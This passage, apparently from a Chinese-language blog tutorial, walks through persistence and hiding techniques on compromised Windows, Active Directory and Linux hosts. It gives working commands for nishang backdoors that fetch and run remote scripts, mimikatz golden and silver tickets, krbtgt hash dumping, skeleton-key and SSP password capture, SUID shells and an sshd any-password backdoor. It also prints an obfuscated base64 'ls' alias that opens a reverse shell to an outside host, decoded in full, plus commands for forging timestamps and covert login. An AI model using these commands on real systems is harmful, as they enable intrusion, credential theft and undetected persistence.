<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe sdset teamssix <span class="string">&quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111976.png" alt="img"></p>
<p>使用以下命令就能恢复</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; $env:SystemRoot\System32\sc.exe sdset teamssix <span class="string">&quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-nishang-后门"><a href="#7-nishang-后门" class="headerlink" title="7.nishang 后门"></a>7.nishang 后门</h3><p>nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具，nishang 项目下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<h4 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd nishang\Backdoors</span><br><span class="line">Import-Module .\HTTP-Backdoor.ps1</span><br><span class="line">HTTP-Backdoor -CheckURL http://<span class="number">192.168</span><span class="number">.7</span><span class="number">.1</span>/<span class="number">1.</span>txt -PayloadURL http://<span class="number">192.168</span><span class="number">.7</span><span class="number">.1</span>/calc.ps1 -MagicString start -StopString stop</span><br></pre></td></tr></table></figure>

<p>命令解释如下：</p>
<p>-CheckURL 如果检测地址存在，再执行 Payload 里的脚本</p>
<p>-PayloadURL 需要下载的 PowerShell 脚本地址</p>
<p>-StopString 判断存在 -CheckURL 返回的字符串，则停止执行</p>
<p>-MagicString 判断存在 -CheckURL 返回的字符串，则开始执行</p>
<p>这个脚本感觉是挺有意思的，该脚本会不断读取 CheckURL 的内容，这里设置的 MagicString 为 start，那么当 <a target="_blank" rel="noopener" href="http://192.168.7.1/1.txt">http://192.168.7.1/1.txt</a> 内容为 start 的时候，就会执行 <a target="_blank" rel="noopener" href="http://192.168.7.1/calc.ps1">http://192.168.7.1/calc.ps1</a> 脚本。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111060.png" alt="img"></p>
<h4 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h4><p>Add-ScrnSaveBackdoor 脚本可以帮助攻击者利用 Windows 的屏幕保护程序来安装一个隐藏的后门，该脚本需要管理员权限。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Add-ScrnSaveBackdoor.ps1</span><br><span class="line">Add-ScrnSaveBackdoor -Payload <span class="string">&quot;Powershell.exe calc&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111027.png" alt="img"></p>
<p>当屏幕保护程序启动时，就会运行 Payload 里的内容</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111350.png" alt="img"></p>
<p>除了上面的两个脚本外，还有 Execute-OnTime 和 Invoke-ADSBackdoor</p>
<p>其中 Execute-OnTime 和 HTTP-Backdoor 脚本的使用方法相似，不过增加了定时启动脚本的功能。</p>
<p>Windows 下的制作后门方法当然不止上面这些，还有其他的比如进程注入.dll 劫持等等。</p>
<h2 id="二：Windows-文件隐藏"><a href="#二：Windows-文件隐藏" class="headerlink" title="二：Windows 文件隐藏"></a>二：Windows 文件隐藏</h2><h3 id="1-文件属性"><a href="#1-文件属性" class="headerlink" title="1.文件属性"></a>1.文件属性</h3><p>直接右击选择隐藏即可</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203091111378.png" alt="img"></p>
<p>如果想显示文件，就在文件夹选择中选择「显示隐藏的文件.文件夹和驱动器」就行了</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995824-299239-image.png" alt="img"></p>
<p>也可以使用 attrib +s +a +h +r 命令</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995831-613157-image.png" alt="img"></p>
<p>不过将下图中的两个选择设置成如图中的样子也就可以看到隐藏的文件了。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995848-180356-image.png" alt="img"></p>
<h3 id="2-ADS"><a href="#2-ADS" class="headerlink" title="2.ADS"></a>2.ADS</h3><p>ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo teamssix &gt; CreateHiddenAccount_v0<span class="number">.2</span>.exe:test.txt</span><br></pre></td></tr></table></figure>

<p>使用 dir 是看不到的，使用 dir &#x2F;r 才可以</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995857-995048-image.png" alt="img"></p>
<p>如果想编辑该文件，可以使用 notepad 进行编辑</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995865-198699-image.png" alt="img"></p>
<p>如果想执行 exe 文件，可以先创建一个快捷方式，再执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> evil.exe &gt; CreateHiddenAccount_v0<span class="number">.2</span>.exe:evil.exe</span><br><span class="line">mklink <span class="string">&quot;C:\Users\test\Desktop\evillink.exe&quot;</span> <span class="string">&quot;C:\Users\test\Desktop\CreateHiddenAccount_v0.2.exe:evil.exe&quot;</span>  // 需要管理员权限</span><br><span class="line">start evil.exe</span><br></pre></td></tr></table></figure>

<p>另外如果想删除这个隐藏文件，需要删除宿主文件才行。</p>
<h3 id="3-系统文件夹伪装"><a href="#3-系统文件夹伪装" class="headerlink" title="3.系统文件夹伪装"></a>3.系统文件夹伪装</h3><p>例如这里有一个 test 文件夹，将 test 命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}，这时文件夹的图标就会变为「我的电脑」图标</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995875-275666-image.png" alt="img"></p>
<p>使用 dir 可以看到里面的文件，但如果点击这个文件夹，就会真的进入到「我的电脑」界面里</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995882-883710-image.png" alt="img"></p>
<p>下面是一些其他的常用标识符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">上帝模式.&#123;ED7BA470-<span class="number">8E54</span>-465E-825C-99712043E01C&#125;</span><br><span class="line">CLSIDexcel.&#123;00020810-<span class="number">0000</span>-<span class="number">0000</span>-C000-000000000046&#125;</span><br><span class="line">word.&#123;00020900-<span class="number">0000</span>-<span class="number">0000</span>-C000-000000000046&#125;</span><br><span class="line">media.&#123;00022603-<span class="number">0000</span>-<span class="number">0000</span>-C000-000000000046&#125;</span><br><span class="line">CAB.&#123;0CD7A5C0-9F37-11CE-AE65-08002B2E1262&#125;</span><br><span class="line">计划任务.&#123;148BD520-A2AB-11CE-B11F-00AA00530503&#125;</span><br><span class="line">搜索-计算机&#123;1f4de370-d627-11d1-ba4f-00a0c91eedba&#125;</span><br><span class="line">网上邻居.&#123;208D2C60-3AEA-<span class="number">1069</span>-A2D7-08002B30309D&#125;</span><br><span class="line">我的电脑.&#123;20D04FE0-3AEA-<span class="number">1069</span>-A2D8-08002B30309D&#125;</span><br><span class="line">控制面板.&#123;21EC2020-3AEA-<span class="number">1069</span>-A2DD-08002B30309D&#125;</span><br><span class="line">打印机.&#123;2227A280-3AEA-<span class="number">1069</span>-A2DE-08002B30309D&#125;</span><br><span class="line">html.&#123;<span class="number">25336920</span>-03f9-11cf-8fd0-00aa00686f13&#125;</span><br><span class="line">mht.&#123;3050F3D9-98B5-11CF-BB82-00AA00BDCE0B&#125;</span><br><span class="line">mshta.&#123;3050f4d8-98B5-11CF-BB82-00AA00BDCE0B&#125;</span><br><span class="line">我的文档.&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;</span><br><span class="line">XML.&#123;48123bc4-99d9-11d1-a6b3-00c04fd91555&#125;</span><br><span class="line">回收站(满).&#123;5ef4af3a-f726-11d0-b8a2-00c04fc309a4&#125;</span><br><span class="line">回收站.&#123;645FF040-<span class="number">5081</span>-101B-9F08-00AA002F954E&#125;</span><br><span class="line">ftp_folder.&#123;63da6ec0-<span class="number">2e98</span>-11cf-8d82-<span class="number">444553540000</span>&#125;</span><br><span class="line">网络和拨号连接.&#123;7007ACC7-<span class="number">3202</span>-11D1-AAD2-00805FC1270E&#125;</span><br><span class="line">写字板文档.&#123;73FDDC80-AEA9-101A-98A7-00AA00374959&#125;</span><br><span class="line">Temporary Offline Files Cleaner.&#123;750fdf0f-2a26-11d1-a3ea-080036587f03&#125;</span><br><span class="line">用户和密码.&#123;7A9D77BD-<span class="number">5403</span>-11d2-<span class="number">8785</span>-<span class="number">2E0420524153</span>&#125;</span><br><span class="line">Internet 临时文件.&#123;7BD29E00-76C1-11CF-9DD0-00A0C9034933&#125;</span><br><span class="line">已下载的程序文件的清除程序.&#123;8369AB20-56C9-11D0-<span class="number">94E8</span>-00AA0059CE02&#125;</span><br><span class="line">公文包.&#123;85BBD920-42A0-<span class="number">1069</span>-A2E4-08002B30309D&#125;</span><br><span class="line">ActiveX 高速缓存文件夹.&#123;88C6C381-<span class="number">2E85</span>-11D0-94DE-<span class="number">444553540000</span>&#125;</span><br><span class="line">mail.&#123;9E56BE60-C50F-11CF-9A2C-00A0C90A90CE&#125;</span><br><span class="line">历史记录.&#123;FF393560-C2A7-11CF-BFF4-<span class="number">444553540000</span>&#125;</span><br><span class="line">目录.&#123;fe1290f0-cfbd-11cf-a330-00aa00c16e65&#125;</span><br><span class="line">Internet Explorer.&#123;FBF23B42-E3F0-101B-<span class="number">8488</span>-00AA003E56F8&#125;</span><br><span class="line">Snapshot File.&#123;FACB5ED2-7F99-11D0-ADE2-00A0C90DC8D9&#125;</span><br><span class="line">预订文件夹.&#123;F5175861-<span class="number">2688</span>-11d0-9C5E-00AA00A45957&#125;</span><br><span class="line">MyDocs Drop Target.&#123;ECF03A32-103D-11d2-854D-006008059367&#125;</span><br><span class="line">Policy Package.&#123;ecabaebd-7f19-11d2-978E-0000f8757e2a&#125;</span><br><span class="line">搜索结果.&#123;e17d4fc0-<span class="number">5564</span>-11d1-83f2-00a0c90dc849&#125;</span><br><span class="line">添加网上邻居.&#123;D4480A50-BA28-11d1-<span class="number">8E75</span>-00C04FA31A86&#125;</span><br><span class="line">Paint.&#123;D3E34B21-9D75-101A-8C3D-00AA001A1652&#125;</span><br><span class="line">管理工具.&#123;D20EA4E1-<span class="number">3957</span>-11d2-A40B-0C5020524153&#125;</span><br><span class="line">字体.&#123;D20EA4E1-<span class="number">3957</span>-11d2-A40B-0C5020524152&#125;</span><br><span class="line">Web Folders.&#123;BDEADF00-C265-11d0-BCED-00A0C90AB50F&#125;</span><br><span class="line">DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;</span><br><span class="line">脱机文件夹.&#123;AFDB1F70-2A4C-11d2-<span class="number">9039</span>-00C04F8EEB3E&#125;</span><br><span class="line">打印机.&#123;2227A280-3AEA-<span class="number">1069</span>-A2DE-08002B30309D&#125;</span><br></pre></td></tr></table></figure>

<p>其他还有畸形文件夹.保留文件名无法删除和利用 Easy File Locker 实现驱动级文件隐藏等等，或者直接起一个看起来名称很像的文件，比如 Index.php 和 lndex.php，这里其中一个是大写的 i，一个是小写的 L</p>
<h2 id="三：域后门"><a href="#三：域后门" class="headerlink" title="三：域后门"></a>三：域后门</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="1.黄金票据"></a>1.黄金票据</h3><p>通过黄金票据可以实现域内任意用户的伪造，因此即使目标域管的密码被修改了，通过黄金票据还是能够获取到对方的权限。</p>
<p>在生成黄金票据前，需要先获取以下信息：</p>
<ul>
<li>krbtgt 的 NTLM Hash 或 AES-256 值</li>
<li>伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域 SID</li>
</ul>
<p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p>
<p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p>
<p>使用 mimikatz 在域控上获取 krbtgt 用户的 NTLM HASH</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:teamssix.com /user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995893-285294-image.png" alt="img"></p>
<p>从图中可以看到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087，SID 为 S-1-5-21-284927032-1122706408-2778656994</p>
<p>此时已知域名为 teamssix.com，那么这时所需要的信息就全了</p>
<p>接着来到一台普通域用户权限的主机下，查看 \dc\c$ 发现时拒绝访问的</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995920-701017-image.png" alt="img"></p>
<p>制作黄金票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:Administrator /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /krbtgt:d685b9c4fa2d318a9943ed68948af087 /ticket:Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995946-803021-image.png" alt="img"></p>
<p>使用 mimikatz 进行票据传递</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995954-114822-image.png" alt="img"></p>
<p>再次查看 \dc\c$ 发现时就有权限了</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995960-720803-image.png" alt="img"></p>
<p>PsExec 也同样可以</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995968-949523-image.png" alt="img"></p>
<h3 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="2.白银票据"></a>2.白银票据</h3><p>白银票据和黄金票据的区别如下：</p>
<p>1.白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志，因此白银票据更加隐蔽。</p>
<p>2.白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，所以白银票据的权限就远不如黄金票据的权限了。</p>
<p>想利用白银票据需要先具备以下信息：</p>
<ul>
<li>域名</li>
<li>域 SID</li>
<li>目标服务器的 FQDN 即完整的域名</li>
<li>可利用的服务</li>
<li>服务账户的 NTLM 哈希</li>
<li>伪造的用户名即任意用户名</li>
</ul>
<p>这里以伪造 CIFS 服务的权限为例：</p>
<p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>

<p>利用获取到的 Hash 生成白银票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;kerberos::golden /user:t /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /target:dc /rc4:ef9e49a41feaa171f642016fd4cb7e7a /service:cifs /ptt&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642995979-523341-image.png" alt="img"></p>
<p>伪造票据后，使用 dir 命令就能获取到目标的 CIFS 服务权限了，除了 CIFS 服务外，还可以伪造 LDAP 等等服务。</p>
<h3 id="3-SSP-权限维持"><a href="#3-SSP-权限维持" class="headerlink" title="3.SSP 权限维持"></a>3.SSP 权限维持</h3><p>通过 SSP 权限维持，用户在登录时，密码将会以明文的形式保存在 C:\Windows\System32\mimilsa.log 下。</p>
<p>使用 mimikatz 将伪造的 SSP 注入内存，但如果域控重启，被注入内存的伪造 SSP 就会丢失。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996006-813298-image.png" alt="img"></p>
<p>注销当前用户，输入用户名密码后重新登录，就可以获取到明文密码了</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996014-193247-image.png" alt="img"></p>
<p>也可以使用 mimikatz 中的 mimilib.dll 文件进行 SSP 权限维持，这种方法重启后也不会失效。</p>
<h3 id="4-SID-History-后门"><a href="#4-SID-History-后门" class="headerlink" title="4.SID History 后门"></a>4.SID History 后门</h3><p>每个用户都有自己的安全标识符即 SID，SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限.能够访问其原来可以访问的资源。</p>
<p>这里使用 mimikatz 将管理员的 SID 添加到普通用户的 SID History 中。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:test /new:administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996022-70539-image.png" alt="img"></p>
<p>使用 test 用户登录，可以看到已经拥有了管理员权限<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996033-818900-image.png" alt="img"></p>
<h3 id="5-万能密码"><a href="#5-万能密码" class="headerlink" title="5.万能密码"></a>5.万能密码</h3><p>在域管权限下，使用 mimikatz 即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996044-182676-image.png" alt="img"></p>
<p>此时，就可以在域内以任意用户的身份利用 mimikatz 密码进行登录了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:teamssix\administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996053-90546-image.png" alt="img"></p>
<p>除了上面的方法外，还可以使用 DSRM 账号进行权限维持，也可以使用 Hook PasswordChangeNotify 脚本查看目标用户修改后的新密码。</p>
<h2 id="四：Linux-主机后门"><a href="#四：Linux-主机后门" class="headerlink" title="四：Linux 主机后门"></a>四：Linux 主机后门</h2><h3 id="1-添加用户"><a href="#1-添加用户" class="headerlink" title="1.添加用户"></a>1.添加用户</h3><p>一句话添加用户</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd test;echo -e <span class="string">&quot;123456\n123456\n&quot;</span> |passwd test</span><br></pre></td></tr></table></figure>

<p>或者使用 openssl</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd -<span class="number">1</span> -salt <span class="string">&#x27;salt&#x27;</span> <span class="number">123456</span>` guest</span><br></pre></td></tr></table></figure>

<h3 id="2-SUID-Shell"><a href="#2-SUID-Shell" class="headerlink" title="2.SUID Shell"></a>2.SUID Shell</h3><p>SUID Shell是一种可用于以拥有者权限运行的shell</p>
<p>以 root 用户权限执行下面的命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /<span class="built_in">bin</span>/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>

<p>在使用普通用户权限的时候，执行以下命令就能获取 root 权限</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/shell -p</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996062-570634-image.png" alt="img"></p>
<h3 id="3-软链接"><a href="#3-软链接" class="headerlink" title="3.软链接"></a>3.软链接</h3><p>软链接的利用前提是 ssh 配置中开启了 PAM 进行身份验证，使用以下命令查看是否配置 PAM 认证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config | grep UsePAM</span><br></pre></td></tr></table></figure>

<p>在目标主机上执行一句话后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=<span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>然后直接 ssh root@IP -p 8888，输入任意密码，就可以登录。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996072-403612-image.png" alt="img"></p>
<h3 id="4-strace-后门"><a href="#4-strace-后门" class="headerlink" title="4.strace 后门"></a>4.strace 后门</h3><p>执行以下命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ssh=<span class="string">&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这时当用户使用 ssh 连接其他主机时，在 &#x2F;tmp&#x2F;.ssh.log 下就能看到连接的密码.操作了，只是显示的不是很直观。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996080-117106-image.png" alt="img"></p>
<p>这个其实也可以说是 alias 后门，例如下面这条命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ls=<span class="string">&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;</span>\<span class="string">&#x27;&#x27;</span>UTF-<span class="number">8</span><span class="string">&#x27;\&#x27;&#x27;</span>)&#125;[sys.version_info[<span class="number">0</span>]](<span class="string">&#x27;\&#x27;&#x27;</span>aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4yNDEuMTI4IiwgNjY2NikpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk=<span class="string">&#x27;\&#x27;&#x27;</span>)))<span class="string">&quot;;&#125;;alerts&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面的 base64 解码后为以下内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line"><span class="keyword">if</span> ret &gt; <span class="number">0</span>:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&quot;192.168.241.128&quot;</span>, <span class="number">6666</span>))</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">        p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>这样当用户使用 ls 命令时，就会反弹 shell 回来了，当然除了反弹 shell 还可以做很多的其他操作。</p>
<p>除此之外，还有比较常见的定时任务.SSH 公钥登录以及 SSH warpper.openssh 后门.PAM 后门.rootkit 后门等等。</p>
<h2 id="五：Linux-隐藏文件"><a href="#五：Linux-隐藏文件" class="headerlink" title="五：Linux 隐藏文件"></a>五：Linux 隐藏文件</h2><h3 id="1-隐藏文件时间戳"><a href="#1-隐藏文件时间戳" class="headerlink" title="1.隐藏文件时间戳"></a>1.隐藏文件时间戳</h3><p>复制其他文件的时间</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r teamssix.txt evil.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996090-30273-image.png" alt="img"></p>
<p>自定义文件的时间，这里表示将时间改为 2022 年的 1 月 1 日 1 时 1 分 1 秒</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -t <span class="number">202201010101.01</span> evil.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/1642996100-81900-image.png" alt="img"></p>
<h3 id="2-隐身登录"><a href="#2-隐身登录" class="headerlink" title="2.隐身登录"></a>2.隐身登录</h3><p>隐身登录系统，不会被 w.who.last 检测到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@host /<span class="built_in">bin</span>/bash -i</span><br></pre></td></tr></table></figure>

<p>隐身登录系统，同时不保存公钥在本地的 .ssh 目录中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /<span class="built_in">bin</span>/bash –i</span><br></pre></td></tr></table></figure>

<h3 id="3-锁定文件"><a href="#3-锁定文件" class="headerlink" title="3.锁定文件"></a>3.锁定文件</h3><p>当文件被锁定时，是无法删除的</p>
